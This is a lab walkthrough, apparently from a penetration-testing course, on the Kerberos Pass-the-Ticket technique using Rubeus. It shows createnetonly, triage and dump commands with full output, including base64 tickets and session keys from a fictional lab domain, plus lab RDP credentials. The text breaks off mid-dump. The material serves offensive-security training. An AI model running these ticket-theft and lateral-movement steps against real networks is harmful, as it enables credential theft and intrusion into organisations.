# Pass-the-Ticket


The **Pass-the-Ticket (PtT)** attack is a method of lateral movement without touching **LSASS** (Ex: Sekurlsa::LogonPasswords). This has become incredibly important due to protections put around the LSASS Process. In a hardened organization, the contents of LSASS may not be all that valuable, and just peeking into the process will likely alert the Defenders. Pass-the-Ticket takes the user's Ticket Granting Ticket (TGT) or Ticket Granting Service (TGS) Ticket. The TGT is a signed ticket that contains a list of privilege levels. This TGT is passed to the Domain Controller, which will grant the TGS Ticket that can be used to access machines. Stealing either of these tickets makes it possible to perform lateral movement. 


## Sacrificial Processes


This is the most crucial concept to understand regarding Kerberos Attacks, as failure to create a **Sacrificial Process** can result in taking a service down. This is because it is very easy to **overwrite an existing Logon Sessions Kerberos Ticket**. If the local machine account **(SYSTEM$)** loses its Kerberos ticket, it will likely not get another one until a reboot. If a service loses its ticket, it won't get a new one until the service restarts or sometimes a machine reboot.

A **sacrificial process** creates a new Logon Session and passes tickets to that session. This does require administrative rights to the machine and will create additional IOCs (Indicators of Compromise) that could be alerted upon. However, causing an outage during an engagement is much worse than getting caught due to safely doing things.

The Rubeus action [createnetonly](https://github.com/GhostPack/Rubeus#createnetonly) creates a **sacrifical process**, and the future commands will use the **/LUID:0xdeadbeef** to interact with it.


- RDP to 10.129.205.26 with user "htb-student" and password "HTB_@cademy_stdnt!"

- Extract the ticket for the user jefferson.matts and use it to connect to the DC01 and read the flag located at C:\Users\jefferson.matts\Downloads\ptt.txt 

![Remote Desktop](/Ticket-Abuse/Pass-the-Ticket/images/rdp.png) 


## Create a Sacrificial Process with Rubeus 


	.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2


	[*] Action: Create Process (/netonly)


	[*] Using random username and password.

	[*] Showing process : True
	[*] Username        : T37I5B4D
	[*] Domain          : 3XD5GVDB
	[*] Password        : 10VMBPZ9
	[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
	[+] ProcessID       : 6776
	[+] LUID            : 0x105aa9


Rubeus **createnetonly** Admin Privileges. 


	PS C:\> .\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2


	[*] Action: Create Process (/netonly)


	[*] Using random username and password.

	[*] Showing process : True
	[*] Username        : QJZQYNVC
	[*] Domain          : 0QD2NHN1
	[*] Password        : TJJI8GPM
	[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
	[+] ProcessID       : 5996
	[+] LUID            : 0x14ed6f



![Sacrificial Process Creation](/Ticket-Abuse/Pass-the-Ticket/images/create-process.png) 
![Sacrificial Process Creation](/Ticket-Abuse/Pass-the-Ticket/images/create-process-2.png) 




To authenticate to remove services with this ticket, we need to inject into the ProcessID, because we are not using a command and control, we used the option **/show**, which shows the process we just created. It will not show the process if we don't specify **/show**. 


## Reading Tickets

You can check all the tickets you can read and extract using the [triage](https://github.com/GhostPack/Rubeus#triage) action in Rubeus. 



## Rubeus Triage 



	PS C:\Tools> .\Rubeus.exe triage

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2


	Action: Triage Kerberos Tickets (All Users)

	[*] Current LUID    : 0x5eef3

	 -------------------------------------------------------------------------------------------------------------------------------
	 | LUID     | UserName                              | Service                                           | EndTime              |
	 -------------------------------------------------------------------------------------------------------------------------------
	 | 0x13223d | jefferson.matts @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 1/21/2024 8:55:04 PM |
	 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | krbtgt/INLANEFREIGHT.LOCAL                        | 1/21/2024 8:43:53 PM |
	 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | LDAP/DC01.INLANEFREIGHT.LOCAL                     | 1/21/2024 8:43:53 PM |
	 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | cifs/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 1/21/2024 8:43:53 PM |
	 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | WS01$                                             | 1/21/2024 8:43:53 PM |
	 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 1/21/2024 8:43:53 PM |
	 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | krbtgt/INLANEFREIGHT.LOCAL                        | 1/21/2024 8:44:16 PM |
	 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | cifs/DC01.INLANEFREIGHT.LOCAL                     | 1/21/2024 8:44:16 PM |
	 -------------------------------------------------------------------------------------------------------------------------------




Our current LUID (Logon UID) is **0x5eef3**, but no tickets are associated with our session. We can use **klist** to make sure of this.


![klist](/Ticket-Abuse/Pass-the-Ticket-images/klist.png) 




Using Rubeus, we can extract the TGT of **jefferson.matts**. It's the ticket for **jefferson.matts @ INLANEFREIGHT.LOCAL, and with the **krbtgt/INLANEFREIGHT.LOCAL** and a luid of **0x13223d** service (TGT is encrypted using **krbtgt's** secret key). 


## Extracting the Ticket with Rubeus


	PS C:\Tools> .\Rubeus.exe dump /nowrap

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2


	Action: Dump Kerberos Ticket Data (All Users)

	[*] Current LUID    : 0x5eef3

	  UserName                 : jefferson.matts
	  Domain                   : INLANEFREIGHT
	  LogonId                  : 0x153148
	  UserSID                  : S-1-5-21-1870146311-1183348186-593267556-1131
	  AuthenticationPackage    : Kerberos
	  LogonType                : Batch
	  LogonTime                : 1/21/2024 11:01:05 AM
	  LogonServer              : DC01
	  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
	  UserPrincipalName        : jefferson.matts@INLANEFREIGHT.LOCAL


	    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  jefferson.matts
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 11:01:05 AM
	    EndTime                  :  1/21/2024 9:01:05 PM
	    RenewTill                :  1/28/2024 11:01:05 AM
	    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  vec9+IAJeTkbK1B6KTZDVVlXvCzfo7huWhao03s+Ltw=
	    Base64EncodedTicket   :

		 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

	  UserName                 : WS01$
	  Domain                   : INLANEFREIGHT
	  LogonId                  : 0x3e7
	  UserSID                  : S-1-5-18
	  AuthenticationPackage    : Negotiate
	  LogonType                : 0
	  LogonTime                : 1/21/2024 10:43:00 AM
	  LogonServer              :
	  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
	  UserPrincipalName        : WS01$@INLANEFREIGHT.LOCAL


	    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:43:53 AM
	    EndTime                  :  1/21/2024 8:43:53 PM
	    RenewTill                :  1/28/2024 10:43:53 AM
	    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  1xKU7/EFk2f1cWdQhYhMis4MAnfv2uFGvs2+eWOPH7U=
	    Base64EncodedTicket   :

		 doIFxjCCBcKgAwIBBaEDAgEWooIEuTCCBLVhggSxMIIEraADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRjMIIEX6ADAgESoQMCAQKiggRRBIIETfQ8vbZMO8zfvWl7ouQKIId7w3ZXxrs8hMm1v1ruKrBq6bLIDmtbxz7nbNnuzeeUVO+Thsp2TCCI+At2eriIaX8Jc24+935YQ4BTxVGBylJv2vOqx+3QoQ4O3jih6IS8gdegCAfDUfdwQ205qrFPJNl4BP6gYSG92B0kj9yfyVMcBFnsPCa6VlsDembhRU0sWZK39tpfaedvEBCZyyTXBzfuYQKQv98DDd94+1n1G96QVH0nWEqPJer+dcW5ab3YzzRrT4kerD69pOmuEnkTEugw1u2Ve6uBJDnPll2y5hduja7i+hCLpSmpNIVE2QVb30ooplN4hme5wgadwF6fOnoz9oUbe4ZAypT510E3y7NYx5la6KbV0EDKrg2jC4HRuBIAV0xiCCTElUWZWuSp5lxsfW9i//4JiXXQ9rO06nTcAIGJgQCzbNDZijW+objF30c7Cpx4wLQGUU3oft+YfMkX/lmRA+D1ueML0YQIMQQYSpCSRnVF6aN1+NelYPVg48SrEjtsKonNY9q+8b2PKV1/XXS5CUbKx2pc+7WBAXlobPUpWoNTjTyMQvKPv+O7I0DDngPK6bPIN54VHacNXIzBGnNvakve6LrSOPaDy4geph+ri5LvUvkMUn1Vqm5kb64n4mSynJ/9bTOTS9P4Y0j05s3E+iNNUuI4bOA75Q54+7cRBNExpGYCu/DqLaQw6/FKOrshbl8c2WZ67dxYEab4zrGQEXt3xoAofw2A7RJ5K09wizxDqCC4e4p+zyIM4INBzGuOYvNYwWpuBpqWZInd7bAV/n30gOzSgqa/gKwqu8Opgfw6MdjWWIyqfZc+sT45RybGssRVUHMjzrvOMrHzFcTCzeppJi2zLHvL6Zk5p0yMEmHtjm03d3JNMlTcsQKMnwUnAC33AUhdqP9fYGfHVwfGl+qmtLe0Xn3RnQnjXGAqIIGYX/t/7xH5wRZSZWtHqtbVxtW6V71GH32O05ElQQsXDYfDDjQlJVQBRfnXyeLs1F1Z7sia1lphh4pqR8P95NiZ4TULPfu9Vc1CLo2hKPlLxJSnR+FSOjWCnQePotvVEEiYBSuDMuoxw2QdB4rrujhKsw+4H64WdIEKgrK5DQRQp0LbxeLktxSIGFKTH178WH+aXPs6awD70SbHc6/FGniPjgsXvsXktIyzRClx4c9KDy1gz67K9p+occEwlNiw9/LjLcB5NL8fwqWuTBdgZts4tFuXrMrzrtmMzGoyT1+GAq3xOK6SuaPhoCFk3G92vDTCOgMcRrpJbJWG/kulWRd8DPyd2aUfxS1TEp3iEoUjQKxpwEylqEeUJpOWL4/GZfRC2w6Wcyc05ftbF6Xr/pcW/VlD2pzLC8YO+3Fz6P5tHLE1vck9VV7xxE+hF+z2+ruXt+eY7RhGjt3acjZpgZEb8grKKuwc5gsO8WOnifYGaqH+G5YSplZ+n3kpQB8Px8DBLrKH6uZLhqOB+DCB9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEINcSlO/xBZNn9XFnUIWITIrODAJ379rhRr7Nvnljjx+1oRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVXUzAxJKMHAwUAQOEAAKURGA8yMDI0MDEyMTE2NDM1M1qmERgPMjAyNDAxMjIwMjQzNTNapxEYDzIwMjQwMTI4MTY0MzUzWqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM


	    ServiceName              :  LDAP/DC01.INLANEFREIGHT.LOCAL
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:43:55 AM
	    EndTime                  :  1/21/2024 8:43:53 PM
	    RenewTill                :  1/28/2024 10:43:53 AM
	    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  jjaHgKeJtTbtWrfR4NyU+cj04jElmggnWtHx3Xd3/kQ=
	    Base64EncodedTicket   :

		 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


	    ServiceName              :  cifs/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:43:54 AM
	    EndTime                  :  1/21/2024 8:43:53 PM
	    RenewTill                :  1/28/2024 10:43:53 AM
	    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  Q7kLmXCOZoZ6Vfl5BcBP/P92jHJZqmxNudbc5f5dTdM=
	    Base64EncodedTicket   :

		 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


	    ServiceName              :  WS01$
	    ServiceRealm             :  INLANEFREIGHT.LOCAL
	    UserName                 :  WS01$
	    UserRealm                :  INLANEFREIGHT.LOCAL
	    StartTime                :  1/21/2024 10:43:53 AM
	    EndTime                  :  1/21/2024 8:43:53 PM
	    RenewTill                :  1/28/2024 10:43:53 AM
	    Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
	    KeyType                  :  aes256_cts_hmac_sha1
	    Base64(key)              :  ydMpnEJZHudjtPS7/kfezxpUOHMCIsTaw3gTy32GtTQ=
	    Base64EncodedTicket   :

		 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


	    ServiceName              :  LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
